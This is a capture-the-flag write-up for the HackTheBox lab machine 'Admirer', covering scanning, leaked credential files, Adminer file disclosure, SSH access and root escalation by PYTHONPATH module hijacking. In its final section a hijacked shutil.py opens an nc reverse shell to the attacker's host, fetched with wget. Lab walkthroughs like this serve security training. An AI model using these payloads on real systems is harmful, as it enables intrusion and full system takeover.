# Admirer | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop$ nmap -A -T4 -p- 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-07 05:31 EDT
Nmap scan report for 10-10-10-187.tpgi.com.au (10.10.10.187)
Host is up (0.34s latency).
Not shown: 65382 closed ports, 150 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                         
                                                                                                                                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                         
Nmap done: 1 IP address (1 host up) scanned in 2175.36 seconds
```
The target has FTP, SSH and an Apache server running.

### 2. Check web server

Robots.txt:
```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```
index.html source code snippet:
```html
<h2>Get in touch</h2>
<form method="post" action="#"> <!-- Still under development... This does not send anything yet, but it looks nice! -->
    <div class="fields">
        <div class="field half">
            <input type="text" name="name" id="name" placeholder="Name" />
        </div>
        <div class="field half">
            <input type="text" name="email" id="email" placeholder="Email" />
        </div>
        <div class="field">
            <textarea name="message" id="message" rows="4" placeholder="Message"></textarea>
        </div>
    </div>
    <ul class="actions">
        <li><input type="submit" value="Send" class="primary" /></li>
        <li><input type="reset" value="Reset" /></li>
```
The comment indicates there may be some partial functiality in this post form request.

### 3. Investigate the admin-dir folder
Fuzzing for files using a modified extensions wordlist:
```bash
kali@kali:~/Desktop$ wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -z file,/home/kali/Desktop/htb/admirer/extensions_common.txt --sc 200 http://10.10.10.187/admin-dir/FUZZFUZ2Z

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/admin-dir/FUZZFUZ2Z
Total requests: 55368

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                               
===================================================================

000012239:   200        29 L     39 W     350 Ch      "contacts - .txt"                                                                                                     

Total time: 2234.434
Processed Requests: 55368
Filtered Requests: 55367
Requests/sec.: 24.77942
```

The contacts.txt file contains a list of e-mail addresses for various roles.
```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

By trying different variations and wordings for password files, I found http://10.10.10.187/admin-dir/credentials.txt:
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

### 4. Investigate FTP
On of the credentials is listed as for FTP, so it can be used to gain access and recieve some files.
```bash
kali@kali:~$ ftp -v 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```
There are only 2 files present on the FTP server, so get them both.
```
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (15.9179 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 14.06 secs (366.0902 kB/s)
ftp> bye
221 Goodbye.
```

### 5. Investigate FTP files
Starting with the html files, extracting the archive reveals a previous version of the website, which is slightly modified from the current version.  
Starting with robots.txt and investigating from there:
```bash
kali@kali:~/Desktop/htb/admirer/ftp/html$ cat robots.txt 
User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo

Disallow: /w4ld0s_s3cr3t_d1r
kali@kali:~/Desktop/htb/admirer/ftp/html$ ls w4ld0s_s3cr3t_d1r/
contacts.txt  credentials.txt

kali@kali:~/Desktop/htb/admirer/ftp/html$ diff ../../html_current/contacts.txt w4ld0s_s3cr3t_d1r/contacts.txt 
kali@kali:~/Desktop/htb/admirer/ftp/html$ diff ../../html_current/credentials.txt w4ld0s_s3cr3t_d1r/credentials.txt
0a1,4
> [Bank Account]
> waldo.11
> Ezy]m27}OREc$
>
```
The diff between the old and new files reveals the older version of the credentials file contains a username and password, labeled as "Bank Account".  
Continuing the investigation:
```bash
kali@kali:~/Desktop/htb/admirer/ftp/html$ cat index.php
...
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
...
```
These are credentials to an SQL database.  
Several directories appear to hold nothing interesting, just code and images for the template site.  
There is some interesting stuff in the utility-scripts directory:
```bash
kali@kali:~/Desktop/htb/admirer/ftp/html$ ls utility-scripts/
admin_tasks.php  db_admin.php  info.php  phptest.php
```
These files in order - admin_tasks.php:
```php
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>

  <p>
  <h4>Select task:</p>
  <form method="POST">
    <select name="task">
      <option value=1>View system uptime</option>
      <option value=2>View logged in users</option>
      <option value=3>View crontab</option>
      <option value=4 disabled>Backup passwd file</option>
      <option value=5 disabled>Backup shadow file</option>
      <option value=6 disabled>Backup web data</option>
      <option value=7 disabled>Backup database</option>
    </select>
    <input type="submit">
  </form>
</body>
</html>
```
With this file, I noted the use of double equals for a loose comparison. This holds potential for some type of PHP type juggling vulerability. I spent some time examining if an exploit to achieve command execution was possible, however there did not appear to be any way to make this script run valid shell commands outside of what it was made to do.  
db_admin.php:
```php
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```
info.php
```php
<?php phpinfo(); ?>
```
phptest.php
```php
<?php
  echo("Just a test to see if PHP works.");
?>
```
To test if these php files are still active in production, we can attempt to access them through the server.
```bash
kali@kali:~/Desktop/htb/admirer/ftp/html$ curl -I http://10.10.10.187/utility-scripts/info.php
HTTP/1.1 200 OK
Date: Wed, 08 Jul 2020 12:08:16 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=UTF-8

kali@kali:~/Desktop/htb/admirer/ftp/html$ curl -I http://10.10.10.187/utility-scripts/phptest.php
HTTP/1.1 200 OK
Date: Wed, 08 Jul 2020 12:08:23 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=UTF-8

kali@kali:~/Desktop/htb/admirer/ftp/html$ curl -I http://10.10.10.187/utility-scripts/admin_tasks.php
HTTP/1.1 200 OK
Date: Wed, 08 Jul 2020 12:08:38 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=UTF-8

kali@kali:~/Desktop/htb/admirer/ftp/html$ curl -I http://10.10.10.187/utility-scripts/db_admin.php
HTTP/1.1 404 Not Found
Date: Wed, 08 Jul 2020 12:08:53 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1
```
It would appear all are active except for the db_admin script. However, at least we got some more creds from that one. It is possible that a better open source alternative is now being used, as mentioned by the comment. There is a number of open-source database management systems that could now be running. While searching for open source PHP database management solutions, I find one called Adminer: https://www.adminer.org/. As this appears to match very closely to the name of the machine, along with using PHP, it becomes the prime suspect.  
The PHP file for this tool is commonly named adminer.php. I don't know exactly where to locate it, but we can quickly check each of the previously-discovered directories. This is super-quick as there is only like 4. The Adminer web interface is found to be located at: http://10.10.10.187/utility-scripts/admin.php.  
I immediately try the collected credentials for waldo that were recovered from index.php, however they fail to log in. I try all other collected credentials, and recieve no different results.  
Taking a step back and looking at the Admirer application, it can be seen that the one which is Admirer 4.6.2, which is far from the latest version. A search for this version immedately reveals an exploit: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool which can leak the admin password.
Another explanation of the issue is at: https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability

### 5. Exploit the PHP/SQL application
To carry out the attack, I would need to set up a MySQL server on my machine. Doing this with MariaDB proved to be a huge pain - it would just not connect cleanly. I kept getting the "MySQL Server has gone away" error which indicates a timeout. Eventually I went looking for alternatives and came across a specifically-built python-based rogue MySQL server that can read arbriary files from the client. This allows me to connect to the database using adminer.php by only specifying the ip address and nothing else! The rogue server hits an exception and fails, but it has already retrieved the /etc/passwd file I directed it to download.  
Now that we can retieve arbritary files from the server, I begin pulling files down and checking them.  
Though this slow process of enumeration, I uncover an updated set of credentials for the "waldo" user in index.php
```php
...
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
...
```
Eventually there appears to be nothing else reachable by this route of enumeration. 

### 6. Get a shell
The logical thing to do with the credentials, which were the only thing gained through Adminer, is to use them to try and log into something else. SSH is the first choice.
```bash
kali@kali:~/Desktop/htb/admirer$ ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Fri Jul 10 13:34:46 2020 from 10.10.14.121
waldo@admirer:~$ cat user.txt
```

### 7. Enumerate again
First we check the new mail.
```bash
From root@admirer.htb Wed Apr 22 11:50:01 2020
Return-path: <root@admirer.htb>
Envelope-to: root@admirer.htb
Delivery-date: Wed, 22 Apr 2020 11:50:01 +0100
Received: from root by admirer.htb with local (Exim 4.89)
        (envelope-from <root@admirer.htb>)
        id 1jRCx7-0000XY-Op
        for root@admirer.htb; Wed, 22 Apr 2020 11:50:01 +0100
From: root@admirer.htb (Cron Daemon)
To: root@admirer.htb
Subject: Cron <root@admirer> rm -r /tmp/*
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1jRCx7-0000XY-Op@admirer.htb>
Date: Wed, 22 Apr 2020 11:50:01 +0100

rm: cannot remove '/tmp/*': No such file or directory
```
The mail file is filled with nothing but these messages, with the timestamp incrementing every 5 minutes. The sender is from the cron daemon, so it is most likely a cron job failing. We will use an enumeration tool to determine what is going on.
Determine the architecture:
```bash
waldo@admirer:~/.temp$ uname -m
x86_64
```
Copy pspy to the machine and run it. Hopefully we can catch the root cron-job when it runs.
```bash
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2020/07/10 14:45:01 CMD: UID=0    PID=5044   | /usr/sbin/CRON 
2020/07/10 14:45:01 CMD: UID=0    PID=5043   | /usr/sbin/CRON 
2020/07/10 14:45:01 CMD: UID=0    PID=5045   | /bin/sh -c rm /home/waldo/*.p* >/dev/null 2>&1
2020/07/10 14:45:20 CMD: UID=33   PID=5049   | /usr/sbin/apache2 -k start 
2020/07/10 14:46:12 CMD: UID=0    PID=5050   | /usr/sbin/apache2 -k start
...
```
We caught the cron job running as root. It is removing any file as identified by *.p*. When no such file exists, the error goes to the mailbox of Waldo. This does not seem to lead anywhere by itself, so we continue enumerating.
```bash
waldo@admirer:~/.temp$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Waldo has admin persmission not only run the admin_tasks.sh script, but also to set enviornment variables for it.
Looking at admin_tasks.sh - which is the file called by the utility script:
```bash
waldo@admirer:~/.temp$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```
Knowing this runs as root on the server means it is a good avenue to escalating privileges. It can be seen that the web backup function calls a python script called backup.py. None of these files can be directly changed from waldo's user account, as they are owned by root:
```bash
waldo@admirer:/opt/scripts$ ls -la
total 16
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
```
backup.py:
```python
waldo@admirer:/opt/scripts$ cat backup.py 
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```
This script makes a backup of the html files in an archive. This script would also run as root. Though this script does not take any user input, it does import an external library through which we could be able to execute code as root. From the python documentation:

*i When a module named spam is imported, the interpreter first searches for a built-in module with that name. If not found, it then searches for a file named spam.py in a list of directories given by the variable sys.path. sys.path is initialized from these locations:
    - The directory containing the input script (or the current directory when no file is specified).
    - PYTHONPATH (a list of directory names, with the same syntax as the shell variable PATH).
    - The installation-dependent default.*

This is where modifying the enironment variable must come in.
Looking back at the pspy-discovered cron job, it's purpose is probably to remove exploit scripts from the home directory after they are executed. A quick check shows no python path currently exists. This would be the ideal thing to change in order to redirect the script to a new shututil module.

### 8. Elevate privileges
We can now create a replacement shutil.py file, as seen below:
```python
def make_archive(var1, var2, var3):
    from os import system
    system('nc -e /bin/sh 10.10.14.173 9999')
```
Start nc on the attacking machine, wget the new shutil.py file, and and then run the admin_tasks.sh script, providing the new PYTHONPATH to the directory we want.
```bash
waldo@admirer:~/.temp$ wget http://10.10.14.173:8000/shutil.py
--2020-07-10 15:26:43--  http://10.10.14.173:8000/shutil.py
Connecting to 10.10.14.173:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 109 [text/plain]
Saving to: ‘shutil.py’

shutil.py         100%[=====================================>]     109  --.-KB/s    in 0s      

2020-07-10 15:26:44 (17.0 MB/s) - ‘shutil.py’ saved [109/109]

waldo@admirer:~/.temp$ sudo PYTHONPATH=/home/waldo/.temp/ /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```
Catch the reverse shell.
```bash
kali@kali:~/Desktop$ nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on admirer 58310
whoami
root
```